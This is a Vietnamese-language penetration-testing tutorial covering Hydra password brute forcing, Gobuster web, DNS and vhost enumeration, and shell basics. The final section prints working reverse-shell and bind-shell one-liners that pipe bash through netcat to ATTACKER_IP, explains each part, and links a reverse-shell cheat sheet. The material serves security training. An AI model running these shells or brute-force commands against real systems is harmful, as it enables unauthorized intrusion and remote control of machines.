# **Hydra**

#### **Lệnh Hydra**

Các tùy chọn chúng ta truyền vào Hydra phụ thuộc vào dịch vụ (giao thức) mà chúng ta đang tấn công. Ví dụ: nếu chúng ta muốn tấn công FTP bằng brute force với tên người dùng là **user**, và danh sách mật khẩu là **passlist.txt**, chúng ta sẽ sử dụng lệnh sau:



**hydra -l user -P passlist.txt ftp://MACHINE\_IP**



Đối với máy được triển khai này, sau đây là các lệnh để sử dụng Hydra trên SSH và biểu mẫu web (phương thức POST).

#### **SSH**

**hydra -l <username> -P <full path to pass> MACHINE\_IP -t 4 ssh**



Lựa chọn	Sự miêu tả

-l	   chỉ định tên người dùng ( SSH ) để đăng nhập

-P	   chỉ ra danh sách mật khẩu

-t	   thiết lập số lượng luồng để sinh ra

Ví dụ : **hydra -l root -P passwords.txt MACHINE\_IP -t 4 ssh** sẽ chạy với các đối số sau:

* **Hydra** sẽ sử dụng **root** làm tên người dùng cho **ssh**
* Nó sẽ thử các mật khẩu trong **passwords.txt** tập tin
* Sẽ có bốn luồng chạy song song như được chỉ ra bởi **-t 4**



#### **Đăng biểu mẫu web**

Chúng ta cũng có thể sử dụng Hydra để tấn công brute force các biểu mẫu web. Bạn phải biết loại yêu cầu mà nó đang thực hiện; phương thức GET hoặc POST thường được sử dụng. Bạn có thể sử dụng tab mạng của trình duyệt (trong công cụ dành cho nhà phát triển) để xem các loại yêu cầu hoặc xem mã nguồn.

**sudo hydra <username> <wordlist> MACHINE\_IP http-post-form "<path>:<login\_credentials>:<invalid\_response>"**



Lựa chọn	                   Sự miêu tả

-l	                    tên người dùng để đăng nhập (biểu mẫu web)

-P	                    danh sách mật khẩu để sử dụng

http-post-form	            loại biểu mẫu là POST

<path>	                    URL trang đăng nhập, ví dụ,login.php

<login\_credentials>	    tên người dùng và mật khẩu được sử dụng để đăng nhập, ví dụ,username=^USER^\&password=^PASS^

<invalid\_response>	    một phần của phản hồi khi đăng nhập không thành công

-V	                    đầu ra chi tiết cho mọi nỗ lực



Dưới đây là một ví dụ cụ thể hơn về lệnh Hydra để tấn công bằng vũ lực vào biểu mẫu đăng nhập POST:

**hydra -l <username> -P <wordlist> MACHINE\_IP http-post-form "/:username=^USER^\&password=^PASS^:F=incorrect" -V**

* Trang đăng nhập chỉ **/** là địa chỉ IP chính.
* Đây **username** là trường biểu mẫu nơi tên người dùng được nhập vào
* Tên người dùng được chỉ định sẽ thay thế **^USER^**
* Đây **password** là trường biểu mẫu nơi mật khẩu được nhập vào
* Mật khẩu được cung cấp sẽ được thay thế **^PASS^**
* Cuối cùng **F=incorrect** là một chuỗi xuất hiện trong phản hồi của máy chủ khi đăng nhập không thành công



# **Gobuster**

#### **Gobuster: Giới thiệu**

Gobuster là một công cụ tấn công mã nguồn mở được viết bằng Golang. Nó liệt kê các thư mục web, tên miền phụ DNS , vhost, kho lưu trữ Amazon S3 và Google Cloud Storage bằng phương pháp brute force, sử dụng danh sách từ cụ thể và xử lý các phản hồi nhận được. Nhiều chuyên gia bảo mật sử dụng công cụ này để kiểm tra thâm nhập, săn tiền thưởng lỗi và đánh giá an ninh mạng. Xem xét các giai đoạn của tấn công mạng có đạo đức, chúng ta có thể đặt Gobuster giữa giai đoạn trinh sát và giai đoạn quét.



Trước khi khám phá Gobuster , chúng ta hãy thảo luận ngắn gọn về các khái niệm liệt kê và Brute Force.



**Sự liệt kê**

Liệt kê là hành động liệt kê tất cả các tài nguyên khả dụng, cho dù chúng có thể truy cập được hay không. Ví dụ: Gobuster liệt kê các thư mục web.



**Sức mạnh thô bạo**

Brute force là hành động thử mọi khả năng cho đến khi tìm được đáp án trùng khớp. Nó giống như việc bạn có mười chiếc chìa khóa và thử tất cả chúng cho đến khi tìm được một chiếc vừa vặn. Gobuster sử dụng danh sách từ cho mục đích này.



**Gobuster : Tổng quan**

Gobuster được tích hợp sẵn trong các bản phân phối như Kali Linux . Hãy bắt đầu bằng cách xem trang trợ giúp của Gobuster . Trang trợ giúp này cung cấp cho chúng ta cái nhìn tổng quan về các chức năng và tùy chọn của nó.

Nhập lệnh sau: **gobuster --help**.



Trang trợ giúp có nhiều phần:

* Cách sử dụng: Hiển thị cú pháp về cách sử dụng lệnh.
* Các lệnh khả dụng: Có nhiều lệnh hỗ trợ chúng ta liệt kê thư mục, tệp, tên miền phụ DNS , nhóm Google Cloud Storage và nhóm Amazon AWS S3 . Trong suốt bài học này, chúng ta sẽ tập trung vào các lệnh dir, dns, và vhost. Chúng ta sẽ tìm hiểu từng lệnh trong các bài tập sau.
* Cờ: Đây là các tùy chọn cụ thể mà chúng ta có thể cấu hình để tùy chỉnh các lệnh của mình. Hãy cùng xem qua các cờ mà chúng ta thường sử dụng trong phòng này:

Cờ ngắn	  Cờ dài	                Sự miêu tả

**-t	--threads**	Cờ này cấu hình số luồng được sử dụng cho quá trình quét. Mỗi luồng gửi yêu cầu với độ trễ nhỏ. Số luồng mặc định là 10. Con số này có thể chậm khi sử dụng danh sách từ lớn. Bạn có thể tăng hoặc giảm số luồng tùy thuộc vào tài nguyên hệ thống khả dụng.

**-w	--wordlist**	Cờ này cấu hình một danh sách từ để sử dụng cho việc lặp lại. Mỗi mục trong danh sách từ được đính kèm vào URL bạn đã đưa vào lệnh.

        **--delay**	        Cờ này xác định khoảng thời gian chờ giữa các lần gửi yêu cầu. Một số máy chủ web có cơ chế phát hiện phép liệt kê bằng cách xem xét số lượng yêu cầu được nhận trong một khoảng thời gian nhất định. Chúng ta có thể tăng độ trễ giữa các yêu cầu tiếp theo để làm cho nó trông giống như lưu lượng truy cập web bình thường.

        **--debug**	        Cờ này giúp chúng ta khắc phục sự cố khi lệnh của chúng ta đưa ra lỗi không mong muốn.

**-o	--output**	Cờ này ghi kết quả liệt kê vào tệp chúng ta chọn.

Ví dụ

Chúng ta hãy xem một ví dụ về cách chúng ta sử dụng các lệnh và cờ này cùng nhau để liệt kê một thư mục web:

**gobuster dir -u "http://www.example.thm/" -w /usr/share/wordlists/dirb/small.txt -t 64**

* gobuster dirchỉ ra rằng chúng ta sẽ sử dụng chế độ liệt kê thư mục và tệp.
* -u "http://www.example.thm/"cho Gobuster biết rằng URL đích là http ://example. thm / .
* -w /usr/share/wordlists/dirb/small.txtchỉ đạo Gobuster sử dụng danh sách từ small.txt để tấn công brute force các thư mục web. Gobuster sẽ sử dụng từng mục trong danh sách từ để tạo một URL mới và gửi yêu cầu GET đến URL đó. Nếu mục đầu tiên của danh sách từ là hình ảnh, Gobuster sẽ gửi yêu cầu GET đến http ://example.thm/images/ .
* -t 64đặt số luồng Gobuster sẽ sử dụng là 64. Điều này cải thiện hiệu suất đáng kể.



#### **Trường hợp sử dụng: Liệt kê thư mục và tệp**

Gobuster có một dirchế độ cho phép người dùng liệt kê các thư mục trang web và các tệp của chúng. Chế độ này hữu ích khi bạn đang thực hiện kiểm tra thâm nhập và muốn xem cấu trúc thư mục của một trang web là gì và nó chứa những tệp nào. Thông thường, cấu trúc thư mục của các trang web và ứng dụng web tuân theo một quy ước cụ thể, khiến chúng dễ bị tấn công Brute Force bằng danh sách từ.

Gobuster rất mạnh mẽ vì nó cho phép bạn quét trang web và trả về mã trạng thái. Các mã trạng thái này sẽ ngay lập tức cho bạn biết liệu bạn, với tư cách là người dùng bên ngoài, có thể yêu cầu thư mục đó hay không.



###### **Giúp đỡ**

Nếu bạn muốn có cái nhìn tổng quan đầy đủ về những gì lệnh **Gobuster dir** có thể cung cấp, bạn có thể xem trang trợ giúp. Việc xem trang trợ giúp chi tiết cho lệnh dir có thể hơi khó khăn. Vì vậy, chúng ta sẽ tập trung vào những cờ quan trọng nhất trong phần này. Nhập lệnh sau để hiển thị trợ giúp: **gobuster dir --help.**



Có nhiều cờ được sử dụng để tinh chỉnh **gobuster dir** lệnh. Việc xem xét từng cờ là ngoài phạm vi bài viết, nhưng trong bảng dưới đây, chúng tôi đã liệt kê các cờ bao hàm hầu hết các tình huống:

Lá cờ	  Cờ dài	                    Sự miêu tả

**-c	--cookies**	Cờ này cấu hình cookie để truyền từng yêu cầu, chẳng hạn như ID phiên.

**-x	--extensions**	Cờ này chỉ định phần mở rộng tệp nào bạn muốn quét. Ví dụ: . php , .js

**-H	--headers**	Cờ này cấu hình toàn bộ tiêu đề để truyền cùng với mỗi yêu cầu.

**-k	--no-tls-validation**	Cờ này bỏ qua quy trình kiểm tra chứng chỉ khi sử dụng https. Điều này thường xảy ra với các sự kiện CTF hoặc phòng thi như trên THM , nơi chứng chỉ tự ký được sử dụng. Điều này gây ra lỗi trong quá trình kiểm tra TLS.

**-n	--no-status**	Bạn có thể đặt cờ này khi không muốn xem mã trạng thái của từng phản hồi nhận được. Điều này giúp giữ cho nội dung hiển thị trên màn hình rõ ràng.

**-P	password**	Bạn có thể đặt cờ này cùng với cờ --username để thực thi các yêu cầu đã được xác thực. Điều này rất tiện lợi khi bạn đã có được thông tin đăng nhập từ người dùng.

**-s	--status-codes**	Với cờ này, bạn có thể cấu hình mã trạng thái của phản hồi nhận được mà bạn muốn hiển thị, chẳng hạn như 200 hoặc phạm vi như 300-400.

**-b	--status-codes-blacklist**	Cờ này cho phép bạn cấu hình mã trạng thái nào của phản hồi nhận được mà bạn không muốn hiển thị. Việc cấu hình cờ này sẽ ghi đè lên cờ -s.

**-U	--username**	Bạn có thể đặt cờ này cùng với --passwordcờ để thực thi các yêu cầu đã được xác thực. Điều này rất tiện lợi khi bạn đã có được thông tin đăng nhập từ người dùng.

**-r	--followredirect**	Cờ này cấu hình Gobuster theo dõi lệnh chuyển hướng mà nó nhận được như một phản hồi cho yêu cầu đã gửi. Mã trạng thái chuyển hướng HTTP (ví dụ: 301 hoặc 302) được sử dụng để chuyển hướng máy khách đến một URL khác.



###### **Cách sử dụng chế độ dir**

Để chạy Gobuster ở dir chế độ này, hãy sử dụng định dạng lệnh sau:

**gobuster dir -u "http://www.example.thm" -w /path/to/wordlist**



Lưu ý rằng lệnh này cũng bao gồm các cờ **-u** và **-w**, bên cạnh **dir** từ khóa. Hai cờ này là bắt buộc để phép liệt kê thư mục Gobuster hoạt động. Hãy cùng xem một ví dụ thực tế về cách liệt kê thư mục và tệp bằng chế độ Gobuster dir:

**gobuster dir -u "http://www.example.thm" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r**



Lệnh này quét tất cả các thư mục nằm tại www.example.thm bằng cách sử dụng danh sách từ directory-list-2.3-medium.txt . Hãy cùng xem xét kỹ hơn từng phần của lệnh:

* **gobuster dir**: Cấu hình Gobuster để sử dụng chế độ liệt kê thư mục và tệp.
* **-u http://www.example.thm**:

-URL sẽ là đường dẫn cơ sở mà Gobuster bắt đầu tìm kiếm. Vì vậy, URL ở trên đang sử dụng thư mục web gốc. Ví dụ: trong một bản cài đặt Apache thông thường trên Linux, đây là /var/www/html. Vì vậy, nếu bạn có thư mục "resources" và muốn liệt kê thư mục đó, bạn sẽ đặt URL là http://www.example.thm/resources. Bạn cũng có thể hiểu nó như http://www.example.thm/path/to/folder.

-URL phải chứa giao thức được sử dụng, trong trường hợp này là HTTP . Điều này rất quan trọng và bắt buộc. Nếu bạn nhập sai giao thức, quá trình quét sẽ thất bại.

-Trong phần máy chủ của URL, bạn có thể điền IP hoặc TÊN MÁY CHỦ. Tuy nhiên, cần lưu ý rằng khi sử dụng IP, bạn có thể nhắm đến một trang web khác với mục đích ban đầu. Một máy chủ web có thể lưu trữ nhiều trang web bằng một IP (kỹ thuật này còn được gọi là lưu trữ ảo). Hãy sử dụng TÊN MÁY CHỦ nếu bạn muốn chắc chắn.

-Gobuster không liệt kê đệ quy. Vì vậy, nếu kết quả hiển thị đường dẫn thư mục bạn quan tâm, bạn sẽ phải liệt kê thư mục cụ thể đó.

* **-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt** Cấu hình Gobuster để sử dụng danh sách từ directory-list-2.3-medium.txt để liệt kê. Mỗi mục trong danh sách từ được thêm vào URL đã cấu hình.
* **-r** Cấu hình Gobuster để theo dõi các phản hồi chuyển hướng nhận được từ các yêu cầu đã gửi. Nếu nhận được mã trạng thái 301, Gobuster sẽ điều hướng đến URL chuyển hướng có trong phản hồi.

Hãy xem ví dụ thứ hai trong đó chúng ta sử dụng **-x** cờ để chỉ định loại tệp mà chúng ta muốn liệt kê:

**gobuster dir -u "http://www.example.thm" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.js**



#### **Trường hợp sử dụng: Liệt kê miền phụ**

Chế độ tiếp theo chúng ta sẽ tập trung vào là dnschế độ . Chế độ này cho phép Gobuster tấn công brute force các tên miền phụ. Trong quá trình kiểm tra thâm nhập, việc kiểm tra các tên miền phụ của tên miền hàng đầu của mục tiêu là rất quan trọng. Việc một cái gì đó được vá trong tên miền chính không có nghĩa là nó cũng được vá trong tên miền phụ đó. Có thể tồn tại cơ hội khai thác lỗ hổng trong một trong những tên miền phụ này.



###### **Giúp đỡ**

Nếu bạn muốn có cái nhìn tổng quan đầy đủ về những gì lệnh **Gobuster DNS** có thể cung cấp, bạn có thể xem trang trợ giúp. Việc xem trang trợ giúp chi tiết về **dns** lệnh có thể hơi khó khăn. Vì vậy, chúng ta sẽ tập trung vào những cờ quan trọng nhất trong phần này. Nhập lệnh sau để hiển thị trợ giúp: **gobuster dns --help**



Chế độ này **dns** cung cấp ít cờ hơn **dir** chế độ mặc định. Tuy nhiên, chúng vẫn đủ để bao quát hầu hết các trường hợp liệt kê tên miền phụ DNS . Hãy cùng xem qua một số cờ thường dùng:



Lá cờ	          Cờ dài	              Sự miêu tả

-c           --show-cname      Hiển thị Bản ghi CNAME (không thể sử dụng với -icờ).

-i           --show-ips        Bao gồm cờ này sẽ hiển thị địa chỉ IP mà tên miền và tên miền phụ phân giải.

-r           --resolver        Cờ này cấu hình máy chủ DNS tùy chỉnh để sử dụng cho mục đích giải quyết.

-d           --domain          Cờ này cấu hình miền mà bạn muốn liệt kê.



###### **Cách sử dụng chế độ DNS**

Để chạy Gobuster ở chế độ DNS , hãy sử dụng cú pháp lệnh sau:

**gobuster dns -d example.thm -w /path/to/wordlist**



Lưu ý rằng lệnh này cũng bao gồm các cờ **-d** và **-w**, bên cạnh từ khóa. Hai cờ này là bắt buộc để tính năng liệt kê tên miền phụ Gobuster hoạt động. Hãy cùng xem một ví dụ về cách liệt kê tên miền phụ với chế độ DNS **dns Gobuster :**

**gobuster dns -d example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt**



* **gobuster dns** liệt kê các tên miền phụ trên tên miền được cấu hình.
* **-d example.thm** đặt mục tiêu vào miền ví dụ .
* **-w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt** đặt danh sách từ thành s ubdomains-top1million-5000.txt . Gobuster sử dụng từng mục trong danh sách này để xây dựng một truy vấn DNS mới . Nếu mục đầu tiên của danh sách này là 'all', truy vấn sẽ là all.example.thm .



#### **Trường hợp sử dụng: Liệt kê Vhost**

Chế độ cuối cùng mà chúng ta sẽ tập trung vào là **vhost** chế độ . Chế độ này cho phép **Gobuster** tấn công brute force các máy chủ ảo. Máy chủ ảo là các trang web khác nhau trên cùng một máy. Đôi khi, chúng trông giống như các tên miền phụ, nhưng đừng để bị đánh lừa! Máy chủ ảo dựa trên IP và chạy trên cùng một máy chủ. Tên miền phụ được thiết lập trong DNS. Sự khác biệt giữa chế độ **vhost** và **dns** chế độ nằm ở cách **Gobuster** quét:



**vhost** chế độ sẽ điều hướng đến URL được tạo bằng cách kết hợp TÊN MÁY CHỦ được cấu hình (cờ **-u**) với mục nhập của danh sách từ.

**dns** chế độ này sẽ thực hiện tra cứu DNS tới FQDN được tạo bằng cách kết hợp tên miền đã cấu hình (cờ **-d**) với mục nhập của danh sách từ.



###### **Giúp đỡ**

Nếu bạn muốn có cái nhìn tổng quan đầy đủ về những gì lệnh **Gobuster vhost** có thể cung cấp, bạn có thể xem trang trợ giúp. Việc xem trang trợ giúp chi tiết về lệnh **vhost** có thể hơi khó khăn. Vì vậy, chúng ta sẽ tập trung vào những cờ quan trọng nhất trong bài viết này. Nhập lệnh sau để hiển thị trợ giúp: **gobuster vhost --help**



Chế độ này **vhost** cung cấp các cờ tương tự như chế độ **dir**. Chúng ta hãy cùng xem qua một số cờ thường dùng:



Cờ ngắn	         Cờ dài	              Sự miêu tả

-u          --url            Chỉ định URL cơ sở (tên miền mục tiêu) để tấn công bằng cách thử tên máy chủ ảo.

            --append-domain  Thêm tên miền cơ sở vào mỗi từ trong danh sách từ (ví dụ: word.example.com).

-m          --method         Chỉ định phương thức HTTP sử dụng cho các yêu cầu (ví dụ: GET, POST).

            --domain         Thêm một miền vào mỗi mục danh sách từ để tạo thành tên máy chủ hợp lệ (hữu ích nếu không được cung cấp rõ ràng).

            --exclude-length Loại trừ kết quả dựa trên độ dài của nội dung phản hồi (hữu ích để lọc ra những phản hồi không mong muốn).

-r          --follow-redirect Theo dõi chuyển hướng HTTP (hữu ích trong trường hợp tên miền phụ có thể chuyển hướng).



###### **Cách sử dụng chế độ vhost**

Để chạy Gobuster ở vhostchế độ này, hãy nhập lệnh sau:

**gobuster vhost -u "http://example.thm" -w /path/to/wordlist**



Lưu ý rằng lệnh này cũng bao gồm các cờ **-u** và **-w**, bên cạnh **vhost** từ khóa. Hai cờ này là bắt buộc để phép liệt kê **vhost Gobuster** hoạt động.



**Gobuster** sẽ gửi nhiều yêu cầu, mỗi lần thay đổi một **Host:** phần của yêu cầu. Giá trị của **Host:** trong ví dụ này là **www.example.thm** . Chúng ta có thể chia thành ba phần :

* **www**: Đây là tên miền phụ. Đây là phần mà Gobuster sẽ điền vào với mỗi mục nhập trong danh sách từ đã cấu hình.
* **.example**: Đây là tên miền cấp hai. Bạn có thể cấu hình tên miền này bằng --domain cờ (cần phải cấu hình cùng với tên miền cấp cao nhất).
* **.thm**: Đây là tên miền cấp cao nhất. Bạn có thể cấu hình tên miền này bằng --domain cờ (cần cấu hình cùng với tên miền cấp hai).



Bây giờ chúng ta đã biết cách **Gobuster** gửi yêu cầu, hãy cùng phân tích lệnh và xem xét kỹ hơn từng cờ:

* **gobuster vhost** hướng dẫn Gobuster liệt kê các máy chủ ảo.
* **-u "http://MACHINE\_IP"** đặt URL để duyệt đến MACHINE\_IP.
* **-w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt** Cấu hình Gobuster để sử dụng danh sách từ subdomains-top1million-5000.txt . Gobuster sẽ thêm từng mục trong danh sách từ vào tên miền đã cấu hình. Nếu không có tên miền nào được cấu hình rõ ràng với --domaincờ này, Gobuster sẽ trích xuất tên miền đó từ URL. Ví dụ: test.example.thm , help.example.thm , v.v. Nếu tìm thấy bất kỳ tên miền phụ nào, Gobuster sẽ báo cáo chúng cho bạn trong terminal.
* **--domain example.thm** đặt tên miền cấp cao nhất và cấp hai trong Hostname:phần yêu cầu tới example.thm.
* **--append-domain** thêm tên miền đã cấu hình vào mỗi mục trong danh sách từ. Nếu cờ này không được cấu hình, tên máy chủ được đặt sẽ là www , blog , v.v. Điều này sẽ khiến lệnh hoạt động không chính xác và hiển thị kết quả dương tính giả.
* **--exclude-length** lọc các phản hồi chúng ta nhận được từ các yêu cầu web đã gửi. Với cờ này, chúng ta có thể lọc ra các kết quả dương tính giả. Nếu bạn chạy lệnh mà không có cờ này, bạn sẽ nhận thấy rất nhiều kết quả dương tính giả như "Đã tìm thấy: Orion.example.thm Status: 404 \[Size: 279]" hoặc "Đã tìm thấy: pm.example.thm Status: 404 \[Size: 276]". Các kết quả dương tính giả này thường có kích thước phản hồi tương tự nhau, vì vậy chúng ta có thể sử dụng cờ này để lọc ra hầu hết các kết quả dương tính giả. Chúng ta mong đợi nhận được phản hồi 200 OK để có kết quả dương tính thật. Tuy nhiên, cũng có một số ngoại lệ, nhưng việc đi sâu hơn vào những trường hợp này không nằm trong phạm vi của bài viết này.

# 

# **Tổng quan về Shell(Shell overview)**

#### **Shell Overview**

###### **Shell là gì?**

Shell là phần mềm cho phép người dùng tương tác với hệ điều hành . Nó có thể là giao diện đồ họa, nhưng thường là giao diện dòng lệnh, và điều này sẽ tùy thuộc vào hệ điều hành đang chạy trên hệ thống đích.



Trong an ninh mạng, nó thường đề cập đến một phiên shell cụ thể mà kẻ tấn công sử dụng khi truy cập vào hệ thống bị xâm nhập, cho phép chúng chạy lệnh và thực thi phần mềm. Điều này  sẽ cho phép kẻ tấn công thực hiện một số hoạt động, một số trong đó được mô tả dưới đây.

* Điều khiển hệ thống từ xa : cho phép kẻ tấn công thực hiện lệnh hoặc phần mềm từ xa trong hệ thống mục tiêu.
* Tăng quyền : Nếu quyền truy cập ban đầu thông qua shell bị giới hạn hoặc hạn chế, kẻ tấn công có thể tìm cách tăng quyền truy cập lên cấp độ cao hơn hoặc quyền truy cập quản trị.
* Rò rỉ dữ liệu : Khi kẻ tấn công có quyền truy cập để thực thi lệnh thông qua shell đã lấy được, chúng có thể khám phá hệ thống để đọc và sao chép dữ liệu nhạy cảm từ đó.
* Quyền truy cập duy trì và bảo trì : Sau khi có được quyền truy cập shell, kẻ tấn công có thể tạo quyền truy cập thông qua người dùng và thông tin đăng nhập hoặc sao chép phần mềm cửa sau để duy trì quyền truy cập vào hệ thống mục tiêu để sử dụng sau này.
* Hoạt động sau khi khai thác : Sau khi được cấp quyền truy cập vào shell, kẻ tấn công có thể thực hiện nhiều hoạt động sau khi khai thác, chẳng hạn như triển khai phần mềm độc hại, tạo tài khoản ẩn và xóa thông tin.
* Truy cập các hệ thống khác trên mạng : Tùy thuộc vào ý định của kẻ tấn công, shell thu được có thể chỉ là điểm truy cập ban đầu. Mục tiêu có thể là nhảy qua mạng đến một mục tiêu khác bằng cách sử dụng shell thu được làm điểm trung chuyển đến các điểm khác nhau trong mạng hệ thống bị xâm nhập. Điều này còn được gọi là xoay vòng.



###### **Vỏ ngược(Reverse Shell)**

**Vỏ ngược**

Reverse Shell, đôi khi được gọi là "connect back shell", là một trong những kỹ thuật phổ biến nhất để truy cập hệ thống trong các cuộc tấn công mạng. Các kết nối bắt đầu từ hệ thống mục tiêu đến máy tính của kẻ tấn công, giúp tránh bị phát hiện bởi tường lửa mạng và các thiết bị bảo mật khác.



**Cách thức hoạt động của Reverse Shell**

Thiết lập **Netcat (nc)** Listener

Bây giờ, hãy cùng tìm hiểu cách hoạt động của reverse shell trong một tình huống thực tế bằng công cụ **Netcat**. Tiện ích này hỗ trợ nhiều hệ điều hành và cho phép đọc và ghi qua mạng.



Như đã đề cập ở trên, shell ngược sẽ kết nối trở lại máy của kẻ tấn công. Máy này sẽ chờ kết nối, vì vậy hãy sử dụng **Netcat** để lắng nghe kết nối bằng lệnh sau **nc -lvnp 443.**



Lệnh trên sử dụng **-l** tùy chọn để chỉ định **Netcat** lắng nghe hoặc chờ kết nối. **-v** Tùy chọn này kích hoạt chế độ chi tiết. **-n** Tùy chọn này ngăn các kết nối sử dụng DNS để tra cứu, do đó nó sẽ không phân giải bất kỳ tên máy chủ nào mà sẽ sử dụng địa chỉ IP. Cuối cùng, **-p** cờ chỉ ra cổng sẽ được sử dụng để chờ kết nối, trong trường hợp trên là cổng 443 .



Bất kỳ cổng nào cũng có thể được sử dụng để chờ kết nối, nhưng kẻ tấn công và người kiểm tra thâm nhập có xu hướng sử dụng các cổng đã biết được sử dụng bởi các ứng dụng khác như 53 , 80 , 8080 , 443 , 139 hoặc 445. Điều này nhằm mục đích trộn lẫn reverse shell với lưu lượng hợp pháp và tránh bị các thiết bị bảo mật phát hiện.



**Truy cập Shell ngược**

Sau khi thiết lập xong trình lắng nghe, kẻ tấn công sẽ thực thi cái gọi là payload shell ngược. Payload này thường lợi dụng lỗ hổng hoặc quyền truy cập trái phép do kẻ tấn công cấp và thực thi một lệnh sẽ phơi bày shell qua mạng. Có nhiều payload khác nhau tùy thuộc vào công cụ và hệ điều hành của hệ thống bị xâm nhập. Chúng ta có thể tìm hiểu một số payload tại đây .

(**https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet**)



Ví dụ, chúng ta hãy phân tích một tải trọng mẫu có tên là vỏ ngược đường ống , như được hiển thị bên dưới.

**rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>\&1 | nc ATTACKER\_IP ATTACKER\_PORT >/tmp/f**

Giải thích về Tải trọng

* **rm -f /tmp/f**- Lệnh này xóa bất kỳ tệp đường ống có tên nào hiện có tại **/tmp/f/**. Điều này đảm bảo rằng tập lệnh có thể tạo đường ống có tên mới mà không có xung đột.
* **mkfifo /tmp/f**- Lệnh này tạo một đường ống có tên, hay FIFO (vào trước, ra trước), tại **/tmp/f**. Đường ống có tên cho phép giao tiếp hai chiều giữa các tiến trình. Trong bối cảnh này, nó hoạt động như một đường dẫn cho đầu vào và đầu ra.
* **cat /tmp/f**- Lệnh này đọc dữ liệu từ đường ống được đặt tên. Lệnh này chờ dữ liệu đầu vào có thể được gửi qua đường ống.
* **| bash -i 2>\&1**- Đầu ra của  **cat** được chuyển đến một phiên bản shell **( bash -i)**, cho phép kẻ tấn công thực thi các lệnh một cách tương tác. **2>\&1** Chuyển hướng lỗi chuẩn đến đầu ra chuẩn, đảm bảo rằng các thông báo lỗi được gửi lại cho kẻ tấn công.
* **| nc ATTACKER\_IP ATTACKER\_PORT >/tmp/f**- Phần này chuyển đầu ra của shell qua **nc(Netcat)** đến địa chỉ IP của kẻ tấn công **( ATTACKER\_IP)** trên cổng của kẻ tấn công **( ATTACKER\_PORT).**
* **>/tmp/f** - Phần cuối cùng này gửi đầu ra của lệnh trở lại đường ống được đặt tên, cho phép giao tiếp hai chiều.

Tải trọng ở trên có thể hiển thị shell **bash** thông qua mạng tới trình lắng nghe mong muốn.



**Kẻ tấn công nhận được vỏ đạn**

Sau khi tải trọng trên được thực thi, kẻ tấn công sẽ nhận được một shell ngược , như được hiển thị bên dưới, cho phép chúng thực thi các lệnh như thể chúng đang đăng nhập vào một thiết bị đầu cuối thông thường trong hệ điều hành .



#### **Vỏ ràng buộc(Blind Shell)**

###### **Vỏ ràng buộc**

Như tên gọi cho thấy, shell bind sẽ liên kết một cổng trên hệ thống bị xâm phạm và lắng nghe kết nối; khi kết nối này xảy ra, nó sẽ phơi bày phiên shell để kẻ tấn công có thể thực thi lệnh từ xa.

Phương pháp này có thể được sử dụng khi mục tiêu bị xâm phạm không cho phép kết nối đi, nhưng phương pháp này ít phổ biến hơn vì nó cần phải hoạt động và lắng nghe các kết nối, điều này có thể dẫn đến việc bị phát hiện.



###### **Cách thức hoạt động của bind shell**

Thiết lập Bind Shell trên mục tiêu



Hãy tạo một shell bind. Trong trường hợp này, kẻ tấn công có thể sử dụng lệnh như bên dưới trên máy mục tiêu.

**rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>\&1 | nc -l 0.0.0.0 8080 > /tmp/f**

Giải thích về Tải trọng

* **rm -f /tmp/f**- Lệnh này xóa bất kỳ tệp đường ống có tên nào hiện có tại **/tmp/f/**. Điều này đảm bảo rằng tập lệnh có thể tạo đường ống có tên mới mà không có xung đột.
* **mkfifo /tmp/f**- Lệnh này tạo một đường ống được đặt tên, hay FIFO, tại **/tmp/f**. Đường ống được đặt tên cho phép giao tiếp hai chiều giữa các tiến trình. Trong bối cảnh này, nó hoạt động như một đường dẫn cho đầu vào và đầu ra.
* **cat /tmp/f**- Lệnh này đọc dữ liệu từ đường ống được đặt tên. Lệnh này chờ dữ liệu đầu vào có thể được gửi qua đường ống.
* **| bash -i 2>\&1**- Đầu ra của  **cat** được chuyển đến một phiên bản shell ( **bash -i**), cho phép kẻ tấn công thực thi các lệnh một cách tương tác. **2>\&1** Chuyển hướng lỗi chuẩn đến đầu ra chuẩn, đảm bảo thông báo lỗi được trả về cho kẻ tấn công.
* **| nc -l 0.0.0.0 8080**- Khởi động **Netcat** ở chế độ lắng nghe **( -l)** trên tất cả các giao diện **( 0.0.0.0)** và cổng **8080**. Shell sẽ bị lộ trước kẻ tấn công khi chúng kết nối đến cổng này.
* **>/tmp/f** Phần cuối cùng này gửi đầu ra của lệnh trở lại đường ống được đặt tên, cho phép giao tiếp hai chiều.

Lệnh trên sẽ lắng nghe các kết nối đến và hiển thị **shell bash**. Lưu ý rằng các cổng dưới **1024** sẽ yêu cầu **Netcat** được thực thi với quyền cao hơn. Trong trường hợp này, sử dụng cổng **8080** sẽ tránh được điều này.



###### **Kẻ tấn công kết nối với Bind Shell**

Bây giờ máy đích đang chờ kết nối đến, chúng ta có thể sử dụng Netcat một lần nữa bằng lệnh sau để kết nối.

**nc -nv TARGET\_IP 8080**

Giải thích lệnh

* **nc**- Lệnh này sẽ gọi **Netcat** để thiết lập kết nối tới mục tiêu.
* **-n**- Vô hiệu hóa phân giải **DNS** , cho phép **Netcat** hoạt động nhanh hơn và tránh tra cứu không cần thiết.
* **-v**- Chế độ chi tiết cung cấp thông tin chi tiết về quá trình kết nối, chẳng hạn như thời điểm kết nối được thiết lập.
* **TARGET\_IP**- Địa chỉ IP của máy đích nơi shell bind đang chạy.
* **8080**- Số cổng mà shell bind lắng nghe.



###### **Người nghe Shell(Shell Listeners)**

**Rlwrap**

Đây là một tiện ích nhỏ sử dụng thư viện GNU readline để cung cấp bàn phím chỉnh sửa và lịch sử.

Ví dụ sử dụng (Nâng cao Netcat Shell bằng Rlwrap)

**attacker@kali:~$ rlwrap nc -lvnp 443**

**listening on \[any] 443 ...**

Điều này bao **nc** gồm **rlwrap**, cho phép sử dụng các tính năng như phím mũi tên và lịch sử để tương tác tốt hơn.



**Ncat**

**Ncat** là phiên bản cải tiến của **Netcat** do dự án NMAP phân phối . Nó cung cấp các tính năng bổ sung, chẳng hạn như mã hóa (SSL).

